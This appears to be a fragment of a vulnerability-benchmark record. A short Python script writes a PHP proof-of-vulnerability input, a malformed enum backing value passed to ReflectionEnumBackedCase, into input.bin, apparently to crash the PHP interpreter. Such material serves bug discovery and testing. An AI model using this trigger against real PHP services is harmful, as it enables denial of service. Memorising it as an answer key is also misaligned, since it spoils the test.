    "decoding": "<pov_script>\n\n# Use embedded PoC data\npoc_data = b\"<?enum Inm:int{case Foo=\\xff;}((new ReflectionEnumBackedCase(Inm::class,'Foo'))->getBackingValue())?>\"\n\nwith open(\"input.bin\", \"wb\") as f:\n    f.write(poc_data)\n\n</pov_script>\n",
